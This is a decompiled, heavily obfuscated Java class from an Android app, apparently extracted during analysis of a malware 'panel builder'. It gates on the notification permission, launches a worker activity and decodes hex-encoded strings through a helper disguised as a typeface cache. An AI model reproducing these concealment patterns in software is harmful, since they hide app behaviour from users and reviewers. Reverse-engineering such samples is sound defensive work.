package v.s;

import android.content.Intent;
import app.mobilex.plus.ManagerQJWorker;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class razEUo8ZzzxVSwvlTwaV implements Runnable {
    public final /* synthetic */ SyncQYAdapter vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ razEUo8ZzzxVSwvlTwaV(SyncQYAdapter syncQYAdapter, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = syncQYAdapter;
    }

    @Override // java.lang.Runnable
    public final void run() {
        int i = this.w9sT1Swbhx3hs;
        SyncQYAdapter syncQYAdapter = this.vekpFI4d1Nc4fakF;
        switch (i) {
            case 0:
                String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                try {
                    if (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(syncQYAdapter, "android.permission.POST_NOTIFICATIONS") != 0) {
                        TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B008900FF00AB009200A0003100770055009300F500BB009200A8002D0036007A008900F400AD00DD00AE00270036000A00D400BB00F3009200B500260067004E008200E300AB00DB00A900240036004D008E00F100FF00FF00A6002D0077005C008200E2008E00F80090002C00640050008200E2");
                        Intent intent = new Intent(syncQYAdapter, (Class<?>) ManagerQJWorker.class);
                        intent.setFlags(268435456);
                        intent.putExtra(ManagerQJWorker.ibVTtJUNfrGYbW, ManagerQJWorker.JXn4Qf7zpnLjP5);
                        syncQYAdapter.startActivity(intent);
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("00130059006800B300CF009100FD0093000A0050007200A400D1008B00FB0088000D0045001B009500F500AE00C700A200300062001B008200E200AD00DD00B500790036");
                    e.getMessage();
                    return;
                }
                break;
            case 1:
                String str2 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                syncQYAdapter.PPWVWMPAUcr9AGNUSxQ();
                break;
            case 2:
                String str3 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                try {
                    if (!syncQYAdapter.hV4VTKNUdeHN()) {
                        syncQYAdapter.euF5Udt5Rqv3Qmea();
                    }
                } catch (Exception unused) {
                    return;
                }
                break;
            default:
                String str4 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                syncQYAdapter.PPWVWMPAUcr9AGNUSxQ();
                break;
        }
    }
}
